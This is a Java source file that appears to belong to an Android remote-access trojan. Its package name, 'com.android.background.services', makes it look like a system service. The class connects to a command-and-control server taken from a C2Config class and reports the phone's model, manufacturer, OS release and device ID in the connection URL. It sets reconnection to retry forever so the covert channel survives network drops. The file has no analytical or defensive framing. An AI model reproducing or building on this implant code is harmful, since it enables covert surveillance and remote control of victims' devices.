package com.android.background.services;

import android.content.Context;
import android.net.Uri;
import android.os.Build;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static final IOSocket ourInstance = new IOSocket();
    private Socket ioSocket;

    private IOSocket() {
        try {

            Context ctx = MainService.getContextOfApplication();
            String deviceID = C2Config.getDeviceId(ctx);

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            // Keep retrying after a drop instead of backing off to ~11.5 days:
            // start at 2s, cap at 30s, retry forever. Without this a transient
            // network blip (or a long-poll response past OkHttp's 10s read
            // timeout) silently kills the connection for good.
            opts.reconnectionDelay = 2000;
            opts.reconnectionDelayMax = 30000;

            String url = C2Config.getUrl(ctx)
                    + "?model=" + Uri.encode(Build.MODEL)
                    + "&manf=" + Uri.encode(Build.MANUFACTURER)
                    + "&release=" + Uri.encode(Build.VERSION.RELEASE)
                    + "&id=" + Uri.encode(deviceID);
            ioSocket = IO.socket(url);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }

}
